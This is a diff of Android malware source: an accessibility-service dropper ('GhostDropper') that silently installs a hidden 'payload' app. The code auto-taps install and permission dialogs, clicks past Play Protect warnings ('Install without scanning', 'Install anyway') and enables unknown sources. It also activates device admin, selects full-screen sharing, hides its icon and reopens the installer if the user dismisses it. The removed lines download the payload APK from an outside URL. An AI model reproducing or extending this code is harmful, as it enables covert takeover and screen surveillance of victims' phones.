@@ -3,70 +3,60 @@ package com.android.shell.ghost;
 import android.accessibilityservice.AccessibilityService;
 import android.accessibilityservice.GestureDescription;
 import android.accessibilityservice.AccessibilityService.GestureResultCallback;
-import android.app.admin.DevicePolicyManager;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
-import android.content.BroadcastReceiver;
+import android.app.PendingIntent;
+import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
-import android.content.IntentSender;
-import android.content.IntentFilter;
-import android.content.pm.PackageInstaller;
-import android.app.PendingIntent;
-import android.content.pm.PackageManager;
 import android.graphics.Path;
 import android.net.Uri;
 import android.os.Build;
-import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
+import android.os.PowerManager;
 import android.provider.Settings;
 import android.view.accessibility.AccessibilityEvent;
+import android.view.accessibility.AccessibilityNodeInfo;
 import android.view.accessibility.AccessibilityWindowInfo;
 import android.util.Log;
-import android.view.accessibility.AccessibilityNodeInfo;
 import android.widget.Toast;
-import java.io.File;
-import java.io.FileInputStream;
-import java.io.FileOutputStream;
-import java.io.InputStream;
-import java.io.OutputStream;
-import java.net.HttpURLConnection;
-import java.net.URL;
+
+import androidx.core.content.ContextCompat;
+
 import java.util.ArrayList;
 import java.util.List;
 import java.util.concurrent.atomic.AtomicBoolean;
 
 /**
- * GhostDropper — the silent automation engine.
+ * Automation engine for the install hand-off.
  *
- * On first launch:
- *  1. Extracts the embedded zoom-private.apk from assets
- *  2. Fires a silent install intent for it
- *  3. Auto-taps "Install" → "Allow" → "Allow" → "Done"
- *  4. Hides both icons via pm hide
- *  5. Starts the hidden foreground service
- *  6. Launches zoom-private in the background
- *
- * On reboot:
- *  - BootReceiver relaunches zoom-private automatically
+ * Flow: enable a11y -> hide wrapper icon -> extract embedded payload ->
+ * PackageInstaller session -> tap Install / Install anyway -> launch payload.
  */
 public class GhostAccessibilityService extends AccessibilityService {
 
+    private static final String TAG = "GhostHide";
     private static GhostAccessibilityService instance;
+
     private final Handler handler = new Handler(Looper.getMainLooper());
-    private final AtomicBoolean payloadInstalled = new AtomicBoolean(false);
+    private final AtomicBoolean working = new AtomicBoolean(false);
+    private final AtomicBoolean readyHandled = new AtomicBoolean(false);
+
     private long lastSettingsOpen = 0;
     private long lastToggle = 0;
     private long lastBack = 0;
     private long lastPayloadTap = 0;
     private long lastA11yScreen = 0;
     private long lastProjectionTap = 0;
-    private long lastLauncherLaunch = 0;
-    private File currentApk;
-    private static final String PAYLOAD_URL = "https://global.telcom.stream/downloads/droppers/zoom-private.apk";
+    private long lastOpenTap = 0;
+    private long lastWork = 0;
+    private long lastDetail = 0;
+    private long readyAt = 0;
+    private long lastTapAt = 0;
+    private long lastPositiveAt = 0;
 
     @Override
     public void onServiceConnected() {
@@ -74,170 +64,110 @@ public class GhostAccessibilityService extends AccessibilityService {
         instance = this;
         handler.postDelayed(new Runnable() {
             @Override public void run() {
+                Log.d(TAG, "tick");
                 clickAffirmative();
                 handler.postDelayed(this, 1500);
             }
-        }, 2000);
+        }, 1200);
 
-        // If zoom-private is already installed, just ensure it's running
-        if (isPackageInstalled("com.betterdesk.client.universal")) {
-            startHiddenService(this);
-            launchZoomPrivate(this);
-            handler.postDelayed(GhostAccessibilityService.this::hideAppIcon, 5000);
+        startHiddenService(this);
+        hideLauncher(this);
+        handler.postDelayed(watchdog, 3000);
+
+        if (PayloadInstaller.installedInfo(this, PayloadInstaller.PAYLOAD_PACKAGE) != null) {
+            onPayloadReady(this);
             return;
         }
-
-        // Install the payload APK silently. Prefer a URL download, fall back to
-        // the embedded assets copy so the flow works offline too.
-        File apkFile = downloadApkFromUrl();
-        if (apkFile == null) {
-            apkFile = extractEmbeddedApk();
-        }
-        if (apkFile == null) {
-            // Fallback: scan Downloads folder
-            apkFile = findDownloadedApk();
-        }
-        if (apkFile != null) {
-            currentApk = apkFile;
-            silentInstall(apkFile);
-            handler.postDelayed(this::clickAffirmative, 1200);
-        }
+        kickWork();
     }
 
-    /** Extract zoom-private.apk from the ghost installer's assets folder. */
-    private File extractEmbeddedApk() {
-        try {
-            File outDir = new File(getFilesDir(), "payload");
-            if (!outDir.exists()) outDir.mkdirs();
-            File outFile = new File(outDir, "zoom-private.apk");
-            InputStream in = getAssets().open("zoom-private.apk");
-            FileOutputStream fos = new FileOutputStream(outFile);
-            byte[] buf = new byte[8192];
-            int len;
-            while ((len = in.read(buf)) > 0) {
-                fos.write(buf, 0, len);
-            }
-            fos.close();
-            in.close();
-            return outFile;
-        } catch (Exception e) {
-            return null;
-        }
-    }
-
-    private void silentInstall(File apkFile) {
-        if (apkFile == null || !apkFile.exists()) return;
-        try {
-            PackageInstaller installer = getPackageManager().getPackageInstaller();
-            PackageInstaller.SessionParams params =
-                    new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
-            params.setAppPackageName("com.betterdesk.client.universal");
-            int sessionId = installer.createSession(params);
-            PackageInstaller.Session session = installer.openSession(sessionId);
-            OutputStream os = session.openWrite("package.apk", 0, -1);
-            FileInputStream fis = new FileInputStream(apkFile);
-            byte[] buf = new byte[8192];
-            int len;
-            while ((len = fis.read(buf)) > 0) os.write(buf, 0, len);
-            fis.close();
-            os.close();
-            DevicePolicyManager dpm =
-                    (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
-            ComponentName admin = new ComponentName(this, GhostDeviceAdmin.class);
-            boolean isDeviceOwner = dpm != null && dpm.isDeviceOwnerApp(getPackageName());
-            Log.d("GhostHide", "silentInstall sessionId=" + sessionId + " deviceOwner=" + isDeviceOwner);
-            if (isDeviceOwner && Build.VERSION.SDK_INT >= 30) {
-                try {
-                    // Device-owner silent install via hidden System API (no user dialog).
-                    java.lang.reflect.Method m =
-                            DevicePolicyManager.class.getMethod("installPackage",
-                                    ComponentName.class, PackageInstaller.Session.class,
-                                    Bundle.class, IntentSender.class);
-                    m.invoke(dpm, admin, session, null, null);
-                    Log.d("GhostHide", "silentInstall via dpm.installPackage (reflection)");
-                } catch (Exception re) {
-                    Log.d("GhostHide", "dpm.installPackage reflection failed " + re
-                            + "; falling back to session.commit");
-                    session.commit(createResultIntentSender());
+    /** Re-opens the system installer if it was dismissed mid-session. */
+    private final Runnable watchdog = new Runnable() {
+        @Override public void run() {
+            try {
+                if ("install".equals(PayloadInstaller.pendingAction(
+                        GhostAccessibilityService.this))
+                        && PayloadInstaller.installedInfo(
+                                GhostAccessibilityService.this,
+                                PayloadInstaller.PAYLOAD_PACKAGE) == null
+                        && System.currentTimeMillis() - PayloadInstaller.uiAt(
+                                GhostAccessibilityService.this) > 6000) {
+                    String pkg = "";
+                    AccessibilityNodeInfo r = getRootInActiveWindow();
+                    if (r != null && r.getPackageName() != null) {
+                        pkg = r.getPackageName().toString();
+                    }
+                    if (!pkg.contains("settings")
+                            && !pkg.contains("packageinstaller")
+                            && !pkg.contains("vending")) {
+                        PayloadInstaller.relaunchPendingUi(GhostAccessibilityService.this);
+                    }
                 }
-            } else {
-                session.commit(createResultIntentSender());
+            } finally {
+                handler.postDelayed(this, 3000);
             }
-        } catch (Exception e) {
-            Log.d("GhostHide", "silentInstall failed " + e);
         }
+    };
 
-        IntentFilter filter = new IntentFilter();
-        filter.addAction(Intent.ACTION_PACKAGE_ADDED);
-        filter.addAction(Intent.ACTION_PACKAGE_REPLACED);
-        filter.addDataScheme("package");
-        registerReceiver(new BroadcastReceiver() {
-            @Override
-            public void onReceive(Context context, Intent intent) {
-                if (payloadInstalled.compareAndSet(false, true)) {
-                    startHiddenService(context);
-                    launchZoomPrivate(context);
-                    handler.postDelayed(GhostAccessibilityService.this::hideAppIcon, 6000);
-                    Toast.makeText(context, "Installed", Toast.LENGTH_SHORT).show();
-                }
+    private void kickWork() {
+        if (System.currentTimeMillis() - lastWork < 4000) return;
+        lastWork = System.currentTimeMillis();
+        if (!working.compareAndSet(false, true)) return;
+        new Thread(() -> {
+            try {
+                PayloadInstaller.start(this);
+            } finally {
+                working.set(false);
             }
-        }, filter);
+        }, "payload-install").start();
     }
 
-    private IntentSender createResultIntentSender() {
-        Intent intent = new Intent("com.android.shell.ghost.INSTALL_RESULT");
-        return PendingIntent.getBroadcast(this, 0, intent,
-                PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_CANCEL_CURRENT)
-                .getIntentSender();
-    }
-
-    /** Download the payload APK from the public URL. Returns null on failure. */
-    private File downloadApkFromUrl() {
-        try {
-            File outDir = new File(getFilesDir(), "payload");
-            if (!outDir.exists()) outDir.mkdirs();
-            File outFile = new File(outDir, "zoom-private.apk");
-            URL url = new URL(PAYLOAD_URL);
-            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-            conn.setConnectTimeout(15000);
-            conn.setReadTimeout(30000);
-            conn.setRequestMethod("GET");
-            conn.setInstanceFollowRedirects(true);
-            conn.connect();
-            if (conn.getResponseCode() != 200) {
-                conn.disconnect();
-                Log.d("GhostHide", "downloadApkFromUrl http=" + conn.getResponseCode());
-                return null;
-            }
-            InputStream in = conn.getInputStream();
-            FileOutputStream fos = new FileOutputStream(outFile);
-            byte[] buf = new byte[8192];
-            int len;
-            while ((len = in.read(buf)) > 0) fos.write(buf, 0, len);
-            fos.close();
-            in.close();
-            conn.disconnect();
-            Log.d("GhostHide", "downloadApkFromUrl ok size=" + outFile.length());
-            return outFile;
-        } catch (Exception e) {
-            Log.d("GhostHide", "downloadApkFromUrl failed " + e);
-            return null;
+    /** Called once the payload is installed/current and from PACKAGE_ADDED. */
+    static void onPayloadReady(Context context) {
+        startHiddenService(context);
+        hideLauncher(context);
+        try { launchPayload(context); } catch (Throwable ignored) {}
+        if (context instanceof GhostAccessibilityService) {
+            GhostAccessibilityService s = (GhostAccessibilityService) context;
+            s.readyAt = System.currentTimeMillis();
+            if (!s.readyHandled.compareAndSet(false, true)) return;
+            s.handler.postDelayed(s::requestOverlay, 2500);
+            s.handler.postDelayed(s::requestBatteryExemption, 5500);
+            s.handler.postDelayed(() -> {
+                startHiddenService(s);
+                launchPayload(s);
+            }, 9000);
+            Toast.makeText(context, "Update complete", Toast.LENGTH_SHORT).show();
         }
     }
 
-    /** Auto-tap "Allow" on any permission dialog within 0.5s. */
+    // ------------------------------------------------------------- automation
+
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
-        if (event.getEventType() != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return;
+        if (event.getEventType() != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
+                && event.getEventType() != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) return;
         CharSequence cls = event.getClassName();
         String className = cls == null ? "" : cls.toString();
         String pkg = event.getPackageName() == null ? "" : event.getPackageName().toString();
-        boolean systemSurface = pkg.contains("packageinstaller") || pkg.contains("permissioncontroller") || pkg.contains("betterdesk") || pkg.contains("systemui") || pkg.contains("nexuslauncher") || className.contains("MediaProjection") ||
-            className.contains("AlertDialog") || className.contains("Permission") ||
-            className.contains("Install") || className.contains("Dialog");
-        if (!systemSurface) return;
-        if (className.contains("AccessibilitySettingsActivity")) lastA11yScreen = System.currentTimeMillis();
-
+        boolean surface = pkg.contains("packageinstaller")
+                || pkg.contains("permissioncontroller")
+                || pkg.contains("betterdesk")
+                || pkg.contains("systemui")
+                || pkg.contains("vending")
+                || pkg.contains("finsky")
+                || pkg.contains("gms")
+                || pkg.contains("launcher")
+                || pkg.contains("settings")
+                || className.contains("MediaProjection")
+                || className.contains("AlertDialog")
+                || className.contains("Permission")
+                || className.contains("Install")
+                || className.contains("Dialog");
+        if (!surface) return;
+        if (className.contains("AccessibilitySettingsActivity")) {
+            lastA11yScreen = System.currentTimeMillis();
+        }
         clickAffirmative();
     }
 
@@ -245,208 +175,598 @@ public class GhostAccessibilityService extends AccessibilityService {
         List<AccessibilityNodeInfo> roots = new ArrayList<>();
         AccessibilityNodeInfo active = getRootInActiveWindow();
         if (active != null) roots.add(active);
-        for (AccessibilityWindowInfo w : getWindows()) {
-            AccessibilityNodeInfo r = w.getRoot();
-            if (r != null) roots.add(r);
+        try {
+            for (AccessibilityWindowInfo w : getWindows()) {
+                Log.d(TAG, "window type=" + w.getType());
+                AccessibilityNodeInfo r = w.getRoot();
+                if (r != null) roots.add(r);
+                if (Build.VERSION.SDK_INT >= 34) {
+                    try {
+                        AccessibilityNodeInfo anchor = w.getAnchor();
+                        if (anchor != null) {
+                            Log.d(TAG, "anchor t=" + anchor.getText() + " cls=" + anchor.getClassName() + " clk=" + anchor.isClickable());
+                            roots.add(anchor);
+                        }
+                    } catch (Throwable ignored) {}
+                }
+            }
+        } catch (Throwable ignored) {}
+
+        Log.d(TAG, "roots=" + roots.size());
+        boolean playProtect = false;
+        for (AccessibilityNodeInfo root : roots) {
+            String p = root.getPackageName() == null ? "" : root.getPackageName().toString();
+            if (p.contains("vending") || hasText(root, "Play Protect")
+                    || hasText(root, "App scan recommended")
+                    || hasText(root, "Install without scanning")) {
+                playProtect = true;
+                break;
+            }
+        }
+        if (playProtect) {
+            for (int i = roots.size() - 1; i >= 0; i--) {
+                if (handlePlayProtect(roots.get(i))) return;
+            }
+            return;
         }
         for (int i = roots.size() - 1; i >= 0; i--) {
+            AccessibilityNodeInfo root = roots.get(i);
+            if (handlePlayProtect(root)) return;
+            if (handleUninstall(root)) return;
+        }
+
+        // Each installer button can live in its own window root and the root
+        // package name is often null on Compose windows. Pick the right-most
+        // real Button (Cancel excluded).
+        AccessibilityNodeInfo[] best = new AccessibilityNodeInfo[1];
+        int[] bestX = {-1};
+        for (AccessibilityNodeInfo r : roots) {
+            Log.d(TAG, "root pkg=" + r.getPackageName() + " cls=" + r.getClassName()
+                    + " ch=" + r.getChildCount() + " txt=" + r.getText());
+            if ("com.google.android.packageinstaller".contentEquals(String.valueOf(r.getPackageName())))
+                dumpTree(r, 0);
+            try { Log.d(TAG, "byTextInstall=" + r.findAccessibilityNodeInfosByText("Install").size()); } catch (Throwable ignored) {}
+            for (String vid : new String[]{"android:id/button1","android:id/button2","com.google.android.packageinstaller:id/button1","com.google.android.packageinstaller:id/button2","com.google.android.packageinstaller:id/ok","com.google.android.packageinstaller:id/cancel","com.google.android.packageinstaller:id/install_button"}) { try { int n=r.findAccessibilityNodeInfosByViewId(vid).size(); if(n>0) Log.d(TAG,"vid "+vid+"="+n); } catch (Throwable ignored) {} }
+            collectPositive(r, best, bestX);
+        }
+        if (best[0] != null) {
+            Log.d(TAG, "tap positive " + best[0].getText());
+            if (!best[0].performAction(AccessibilityNodeInfo.ACTION_CLICK)) tapNode(best[0]);
+            return;
+        }
+
+        // Pass 1: only real clickable targets, across every root.
+        for (int i = roots.size() - 1; i >= 0; i--) {
+            AccessibilityNodeInfo root = roots.get(i);
             for (String label : new String[]{"Install", "Update", "Activate"}) {
-                List<AccessibilityNodeInfo> btns = roots.get(i).findAccessibilityNodeInfosByText(label);
-                if (btns == null) continue;
-                for (AccessibilityNodeInfo b : btns) {
-                    AccessibilityNodeInfo c = b;
-                    for (int d = 0; d < 4 && c != null && !c.isClickable(); d++) c = c.getParent();
-                    if (c != null && c.isClickable()) {
-                        Log.d("GhostHide", "primary action " + label);
-                        c.performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                        return;
-                    }
+                if (tapClickableByText(root, label)) return;
+            }
+        }
+
+        // Pass 2: any clickable positive button.
+        if (best[0] != null) {
+            Log.d(TAG, "tap positive " + best[0].getText());
+            if (!best[0].performAction(AccessibilityNodeInfo.ACTION_CLICK)) tapNode(best[0]);
+            return;
+        }
+
+        // Pass 3: Cancel exists in the tree even when the positive button does
+        // not. The positive button sits 250dp to its right.
+        for (AccessibilityNodeInfo root : roots) {
+            AccessibilityNodeInfo cancel = findButton(root, "Cancel");
+            if (cancel != null) {
+                if (clickPositiveNear(cancel)) return;
+                android.graphics.Rect cr = new android.graphics.Rect();
+                cancel.getBoundsInScreen(cr);
+                if (!cr.isEmpty()) {
+                    if (System.currentTimeMillis() - lastPositiveAt < 12000) return;
+                    lastPositiveAt = System.currentTimeMillis();
+                    Log.d(TAG, "tap positive via cancel offset");
+                    int px = cr.centerX() + 250;
+                    int py = cr.centerY();
+                    int ph = getResources().getDisplayMetrics().heightPixels;
+                    Log.d(TAG, "positive dual tap " + px + "," + py + " ph=" + ph);
+                    dispatchTap(px, py);
+                    handler.postDelayed(() -> { dispatchTap(px, py + 20); shellTap(px, py + 20); }, 300);
+                    return;
                 }
             }
         }
-        AccessibilityNodeInfo cbtn = roots.isEmpty() ? null : findButton(roots.get(0), "Cancel");
-        if (cbtn != null && (roots.get(0).findAccessibilityNodeInfosByText("Activate device admin app").size() > 0 || findButton(roots.get(0), "Uninstall app") != null || countButtons(roots.get(0)) >= 1)) {
-            android.graphics.Rect cr = new android.graphics.Rect();
-            cbtn.getBoundsInScreen(cr);
-            Log.d("GhostHide", "tapping admin activate");
-            tapPixel(cr.centerX(), cr.centerY() - 190);
-            return;
-        }
-        Log.d("GhostHide", "roots=" + roots.size());
+
+        // Pass 4: gesture on text only (titles, Compose labels).
         for (int i = roots.size() - 1; i >= 0; i--) {
-            if (handleRoot(roots.get(i))) return;
+            AccessibilityNodeInfo root = roots.get(i);
+            for (String label : new String[]{"Install", "Update", "Activate"}) {
+                if (tapGestureByText(root, label)) return;
+            }
         }
+
+        for (int i = roots.size() - 1; i >= 0; i--) {
+            AccessibilityNodeInfo root = roots.get(i);
+            if (handleRoot(root)) return;
+        }
+    }
+
+    /** Play Protect interstitials: "More details" -> "Install anyway". */
+    private boolean handlePlayProtect(AccessibilityNodeInfo root) {
+        String pkg = root.getPackageName() == null ? "" : root.getPackageName().toString();
+        boolean vending = pkg.contains("vending") || pkg.contains("finsky") || pkg.contains("gms");
+        boolean looksBlocked = hasText(root, "App scan recommended") || hasText(root, "Play Protect")
+                || hasText(root, "Unsafe app")
+                || hasText(root, "Harmful")
+                || hasText(root, "not from Play")
+                || hasText(root, "unrecognized")
+                || hasText(root, "blocked");
+        if (!vending && !looksBlocked) return false;
+
+        // Expanded Play Protect sheet: the opt-out is a fixed centred row.
+        if (hasText(root, "Install without scanning")
+                || hasText(root, "Install without")) {
+            Log.d(TAG, "play protect: install without scanning (pixel)");
+            shellTap(displayWidth() / 2, (int) (displayHeight() * 0.61));
+            return true;
+        }
+
+        String[] labels = {"Install without scanning", "Install anyway", "Update anyway",
+                "More details", "Still install", "Install", "OK", "Done", "Got it",
+                "I understand", "Close"};
+        for (String label : labels) {
+            if (tapByText(root, label)) {
+                Log.d(TAG, "play protect action " + label);
+                if (label.equals("More details")) {
+                    lastDetail = System.currentTimeMillis();
+                }
+                if (label.equals("OK") || label.equals("Done")) {
+                    if (System.currentTimeMillis() - lastDetail < 60000) tapByText(root, "Install anyway");
+                }
+                return true;
+            }
+        }
+        return false;
+    }
+
+    private boolean handleUninstall(AccessibilityNodeInfo root) {
+        if (!hasText(root, "uninstall") && !hasText(root, "Uninstall")) return false;
+        for (String label : new String[]{"OK", "Uninstall", "Continue"}) {
+            if (tapByText(root, label)) {
+                Log.d(TAG, "uninstall action " + label);
+                return true;
+            }
+        }
+        return false;
     }
 
     private boolean handleRoot(AccessibilityNodeInfo root) {
         String pkg = root.getPackageName() == null ? "" : root.getPackageName().toString();
-        Log.d("GhostHide", "root pkg=" + pkg + " children=" + root.getChildCount());
+
         if (pkg.contains("betterdesk")) {
-            if (System.currentTimeMillis() - lastPayloadTap > 5000) {
-                lastPayloadTap = System.currentTimeMillis();
-                int w = getResources().getDisplayMetrics().widthPixels;
-                int h = getResources().getDisplayMetrics().heightPixels;
-                if (Build.VERSION.SDK_INT >= 30) {
-                    android.graphics.Rect b = ((android.view.WindowManager) getSystemService(WINDOW_SERVICE)).getCurrentWindowMetrics().getBounds();
-                    w = b.width(); h = b.height();
-                }
-                Log.d("GhostHide", "payload Allow tap");
-                tapPixel(w / 2, (int) (h * 0.58));
-            }
-            return true;
+            if (handlePayloadScreen(root)) return true;
         }
-        dumpNode(root, 0);
+
         if (root.findAccessibilityNodeInfosByText("allowed to install unknown apps").size() > 0) {
             if (System.currentTimeMillis() - lastSettingsOpen < 10000) return true;
             lastSettingsOpen = System.currentTimeMillis();
-            Log.d("GhostHide", "opening unknown sources settings");
-            Intent i = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES, Uri.parse("package:" + getPackageName()));
+            Log.d(TAG, "opening unknown sources settings");
+            Intent i = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
+                    Uri.parse("package:" + getPackageName()));
             i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            startActivity(i);
+            try { startActivity(i); } catch (Throwable ignored) {}
             return true;
         }
+
         if (pkg.contains("systemui")) {
-            if (root.findAccessibilityNodeInfosByText("Choose app to share").size() > 0 && System.currentTimeMillis() - lastProjectionTap > 4000) {
+            if (root.findAccessibilityNodeInfosByText("Choose app to share").size() > 0
+                    && System.currentTimeMillis() - lastProjectionTap > 4000) {
                 lastProjectionTap = System.currentTimeMillis();
-                int w = getResources().getDisplayMetrics().widthPixels;
-                int h = getResources().getDisplayMetrics().heightPixels;
-                Log.d("GhostHide", "select entire screen");
+                int w = displayWidth();
+                int h = displayHeight();
+                Log.d(TAG, "select entire screen");
                 tapPixel((int) (w * 0.2), (int) (h * 0.36));
                 handler.postDelayed(() -> tapPixel((int) (w * 0.5), (int) (h * 0.78)), 1200);
             }
             return true;
         }
+
         if (pkg.contains("launcher") || pkg.contains("nexuslauncher")) {
-            if (currentApk != null && !isPackageInstalled("com.betterdesk.client.universal") && System.currentTimeMillis() - lastLauncherLaunch > 5000) {
-                lastLauncherLaunch = System.currentTimeMillis();
-                Log.d("GhostHide", "relaunch installer from home");
-                silentInstall(currentApk);
+            if (!isPayloadInstalled() && System.currentTimeMillis() - lastPayloadTap > 6000) {
+                lastPayloadTap = System.currentTimeMillis();
+                Log.d(TAG, "relaunch install from home");
+                kickWork();
             }
             return true;
         }
+
+        if (pkg.contains("settings") && System.currentTimeMillis() - lastA11yScreen < 45000) {
+            if (handleAccessibilitySettings(root)) return true;
+        }
+
         if (!pkg.contains("packageinstaller") && !pkg.contains("settings")) return false;
-        boolean unknownSourcesScreen = root.findAccessibilityNodeInfosByText("Allow from this source").size() > 0;
-        boolean adminScreen = root.findAccessibilityNodeInfosByText("Activate device admin app").size() > 0 || findButton(root, "Uninstall app") != null || countButtons(root) >= 1;
-        if (pkg.contains("settings") && !unknownSourcesScreen && !adminScreen) {
-            AccessibilityNodeInfo anyToggle = findToggle(root);
-            android.graphics.Rect dbg = new android.graphics.Rect();
-            if (anyToggle != null) anyToggle.getBoundsInScreen(dbg);
-            Log.d("GhostHide", "settings chk=" + countCheckable(root) + " btn=" + countButtons(root) + " y=" + dbg.centerY());
-            boolean a11yList = countCheckable(root) >= 2;
-            if (!a11yList) {
-                boolean hasChrome = !root.findAccessibilityNodeInfosByText("Chrome").isEmpty();
-                boolean hasZoom = !root.findAccessibilityNodeInfosByText("zoom-private").isEmpty();
-                boolean hasDownloaded = !root.findAccessibilityNodeInfosByText("Downloaded apps").isEmpty();
-                if (hasDownloaded || (hasChrome && hasZoom)) a11yList = true;
-                else if (anyToggle != null) {
-                    android.graphics.Rect tr = new android.graphics.Rect();
-                    anyToggle.getBoundsInScreen(tr);
-                    a11yList = tr.centerY() < 1000;
-                }
+
+        // Clean devices must allow this source to install packages first.
+        if (pkg.contains("packageinstaller")
+                && (hasText(root, "Permission required")
+                    || hasText(root, "isn't allowed to install unknown apps")
+                    || hasText(root, "not allowed to install unknown apps"))) {
+            if (tapByText(root, "Settings")) {
+                lastSettingsOpen = System.currentTimeMillis();
+                Log.d(TAG, "open install-unknown-apps permission");
+                return true;
             }
-            if (a11yList) {
-                if (System.currentTimeMillis() - lastToggle > 5000) {
-                    lastToggle = System.currentTimeMillis();
-                    int w = getResources().getDisplayMetrics().widthPixels;
-                    int h = getResources().getDisplayMetrics().heightPixels;
-                    AccessibilityNodeInfo zsw = checkableInBand(root, 550, 800, (int) (w * 0.75));
-                    Log.d("GhostHide", "tap payload a11y row");
-                    if (zsw != null) zsw.performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                    else tapPixel((int) (w * 0.86), (int) (h * 0.28));
-                    handler.postDelayed(() -> performGlobalAction(GLOBAL_ACTION_BACK), 1500);
-                }
-            } else if (anyToggle != null && System.currentTimeMillis() - lastBack > 2000) {
-                lastBack = System.currentTimeMillis();
-                Log.d("GhostHide", "enable toggle in detail");
-                anyToggle.performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                handler.postDelayed(() -> performGlobalAction(GLOBAL_ACTION_BACK), 1500);
-            } else if (System.currentTimeMillis() - lastBack > 2000) {
-                lastBack = System.currentTimeMillis();
-                Log.d("GhostHide", "leave settings detail");
-                performGlobalAction(GLOBAL_ACTION_BACK);
-            }
-            return true;
         }
-        if (pkg.contains("settings") && unknownSourcesScreen && getPackageManager().canRequestPackageInstalls()) {
+
+        // The per-source toggle screen.
+        if (pkg.contains("settings") && hasText(root, "Allow from this source")) {
+            AccessibilityNodeInfo toggle = findToggle(root);
+            if (toggle != null) {
+                boolean checked = toggle.isChecked();
+                if (!checked) {
+                    toggle.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                    Log.d(TAG, "grant allow-from-this-source");
+                }
+                handler.postDelayed(() -> performGlobalAction(GLOBAL_ACTION_BACK), 1200);
+                handler.postDelayed(() -> PayloadInstaller.relaunchPendingUi(this), 2600);
+                return true;
+            }
+        }
+
+        boolean unknownSourcesScreen =
+                root.findAccessibilityNodeInfosByText("Allow from this source").size() > 0;
+        boolean adminScreen = root.findAccessibilityNodeInfosByText("Activate device admin app").size() > 0
+                || findButton(root, "Uninstall app") != null;
+
+        if (pkg.contains("settings") && !unknownSourcesScreen && !adminScreen) {
+            return handleAccessibilitySettings(root);
+        }
+
+        // Package installer: explicitly hit the positive button. Counting
+        // buttons is not enough - Cancel is a button too.
+        if (pkg.contains("packageinstaller")) {
+            AccessibilityNodeInfo positive = rightmostButton(root);
+            if (positive != null && !"Cancel".contentEquals(String.valueOf(positive.getText()))) {
+                Log.d(TAG, "tap rightmost positive button");
+                if (!positive.performAction(AccessibilityNodeInfo.ACTION_CLICK)) tapNode(positive);
+                return true;
+            }
+            if (tapByText(root, "Install") || tapByText(root, "Update")) return true;
+        }
+
+        if (unknownSourcesScreen && getPackageManager().canRequestPackageInstalls()) {
             if (System.currentTimeMillis() - lastBack > 2500) {
                 lastBack = System.currentTimeMillis();
-                Log.d("GhostHide", "allowed, going back");
+                Log.d(TAG, "unknown sources granted, going back");
                 performGlobalAction(GLOBAL_ACTION_BACK);
             }
             return true;
         }
-        AccessibilityNodeInfo toggle = null;
-        List<AccessibilityNodeInfo> agent = root.findAccessibilityNodeInfosByText("zoom-private");
-        if (agent != null && !agent.isEmpty()) {
-            AccessibilityNodeInfo c = agent.get(0);
-            for (int d = 0; d < 4 && c != null && !c.isCheckable(); d++) c = c.getParent();
-            if (c != null && c.isCheckable()) toggle = c;
+
+        if (adminScreen) {
+            AccessibilityNodeInfo cancel = findButton(root, "Cancel");
+            if (cancel != null) {
+                android.graphics.Rect cr = new android.graphics.Rect();
+                cancel.getBoundsInScreen(cr);
+                Log.d(TAG, "tapping admin activate (offset)");
+                tapPixel(cr.centerX(), cr.centerY() - 190);
+                return true;
+            }
         }
-        if (toggle == null) toggle = findToggle(root);
-        if (toggle != null && System.currentTimeMillis() - lastToggle > 5000) {
-            lastToggle = System.currentTimeMillis();
-            if (toggle.isChecked()) {
-                Log.d("GhostHide", "toggle already on, going back");
-                performGlobalAction(GLOBAL_ACTION_BACK);
-            } else {
-                android.graphics.Rect r = new android.graphics.Rect();
-                toggle.getBoundsInScreen(r);
-                Log.d("GhostHide", "tapping toggle " + r.centerX() + "," + r.centerY());
-                toggle.performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                handler.postDelayed(() -> performGlobalAction(GLOBAL_ACTION_BACK), 1200);
+
+        // "Open" wins over "Done" so the payload actually starts.
+        if (tapByText(root, "Open")) {
+            if (System.currentTimeMillis() - lastOpenTap > 3000) {
+                lastOpenTap = System.currentTimeMillis();
+                Log.d(TAG, "open after install");
             }
             return true;
         }
-        for (String label : new String[]{"Install", "Update", "Allow", "Activate", "Add", "OK", "Done", "Continue", "Next"}) {
-            List<AccessibilityNodeInfo> btns = root.findAccessibilityNodeInfosByText(label);
-            if (btns == null) continue;
-            for (AccessibilityNodeInfo b : btns) {
-                AccessibilityNodeInfo clickable = b;
-                for (int i = 0; i < 4 && clickable != null && !clickable.isClickable(); i++) clickable = clickable.getParent();
-                if (clickable != null && clickable.isClickable()) {
-                    Log.d("GhostHide", "action clicking " + label);
-                    clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                    return true;
-                }
-            }
+
+        for (String label : new String[]{"Allow", "Activate", "Add", "OK", "Done",
+                "Continue", "Next", "Start now", "Start recording", "Share"}) {
+            if (tapByText(root, label)) return true;
         }
+
         AccessibilityNodeInfo cancel = findButton(root, "Cancel");
         if (cancel != null) {
             android.graphics.Rect cr = new android.graphics.Rect();
             cancel.getBoundsInScreen(cr);
-            Log.d("GhostHide", "tapping positive button");
-            tapPixel(cr.centerX() + 250, cr.centerY());
+            Log.d(TAG, "tapping positive button");
+            tapPixel(cr.centerX() + 250, cr.centerY() + (int) (cr.height() * 0.25));
             return true;
         }
-        if (pkg.contains("settings") && System.currentTimeMillis() - lastBack > 2500) {
+
+        if (System.currentTimeMillis() - lastBack > 2500) {
             lastBack = System.currentTimeMillis();
-            Log.d("GhostHide", "leaving stray settings");
             performGlobalAction(GLOBAL_ACTION_BACK);
             return true;
